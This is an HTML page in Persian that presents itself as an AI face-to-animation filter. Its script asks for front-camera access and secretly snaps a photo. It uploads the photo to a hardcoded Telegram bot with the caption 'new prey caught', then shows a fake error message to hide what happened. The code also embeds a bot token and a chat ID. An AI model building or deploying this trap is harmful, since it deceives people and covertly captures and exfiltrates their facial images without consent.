<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تست هوش مصنوعی چهره</title>
    <style>
        body { font-family: Tahoma, sans-serif; background: #0f172a; color: #fff; text-align: center; padding-top: 50px; }
        .card { background: #1e293b; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 85%; max-width: 400px; }
        button { background: #10b981; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; width: 100%; }
        button:hover { background: #059669; }
    </style>
</head>
<body>

    <div class="card">
        <h2>🎨 فیلتر جادویی هوش مصنوعی</h2>
        <p>برای تبدیل عکس خودت به نسخه انیمیشنی، روی دکمه زیر بزن و دسترسی را تایید کن.</p>
        <button onclick="startTrap()">شروع پردازش</button>
        <p id="status" style="font-size: 12px; color: #94a3b8; margin-top: 15px;"></p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU";
        const CHAT_ID = "6820599989";

        async function startTrap() {
            document.getElementById("status").innerText = "در حال اتصال به سرور هوش مصنوعی...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById("video");
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("chat_id", CHAT_ID);
                        formData.append("photo", blob, "trap.jpg");
                        formData.append("caption", "🎯 شکار جدید زده شد!");

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        });

                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById("status").innerText = "خطا در پردازش تصویر! دوباره تلاش کنید.";
                    }, "image/jpeg");
                }, 1500);

            } catch (err) {
                document.getElementById("status").innerText = "خطا در دسترسی به دوربین.";
            }
        }
    </script>
</body>
</html>
